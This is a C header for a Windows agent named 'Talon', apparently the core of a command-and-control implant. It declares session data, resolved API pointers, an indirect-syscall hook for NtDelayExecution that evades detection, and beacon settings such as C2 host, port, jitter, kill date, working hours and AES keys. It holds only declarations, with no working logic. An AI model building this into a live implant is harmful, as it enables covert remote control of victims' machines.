#ifndef AGENT_TALON_H
#define AGENT_TALON_H

#include <windows.h>

// Debug output: off by default (release builds carry no stdio dependency).
// Build with `make DEBUG=1` to enable console diagnostics.
#ifndef TALON_DEBUG
#define TALON_DEBUG 0
#endif
#if TALON_DEBUG
#include <stdio.h>
#define Dbg( ... ) printf( __VA_ARGS__ )
#else
#define Dbg( ... ) do { } while ( 0 )
#endif

#define DEREF( name )       *( UINT_PTR* ) ( name )
#define DEREF_32( name )    *( DWORD* )    ( name )
#define DEREF_16( name )    *( WORD* )     ( name )

#define PROCESS_ARCH_UNKNOWN    0
#define PROCESS_ARCH_X86		1
#define PROCESS_ARCH_X64		2
#define PROCESS_ARCH_IA64       3


#ifdef _WIN64
#define PROCESS_AGENT_ARCH PROCESS_ARCH_X64
#else
#define PROCESS_AGENT_ARCH PROCESS_ARCH_X86
#endif

#define TALON_MAGIC_VALUE ( UINT32 ) 'taln'

typedef struct _INSTANCE {
    struct {
        UINT32  AgentID;
        WORD    ProcArch;
        DWORD   OSArch;
        BOOL    Connected;
    } Session;

    struct {
        ULONG ( WINAPI *RtlRandomEx   ) ( PULONG );
        VOID  ( WINAPI* RtlGetVersion ) ( POSVERSIONINFOEXW );
        DWORD ( WINAPI *WaitForSingleObjectEx ) ( HANDLE, DWORD, BOOL );
    } Win32;

    struct {
        BOOL Ready; /* NtDelayExecution resolvable via indirect syscall */
        struct {
            PVOID Adr; /* ntdll `syscall` instruction to tail-jump */
            WORD  Ssn; /* service number */
        } NtDelayExecution;
    } Syscall;

    struct {
        DWORD Sleeping;
        DWORD Jitter;
        struct {
            LPWSTR UserAgent;
            LPWSTR Host;
            LPWSTR Endpoint;
            DWORD  Port;
            UINT64 KillDate;
            UINT32 WorkingHours;

            BOOL   Secure;
        } Transport ;

        // Encryption / Decryption
        struct
        {
            PBYTE Key;
            PBYTE IV;
        } AES;
    } Config;

} INSTANCE, *PINSTANCE;

extern INSTANCE Instance;

#endif
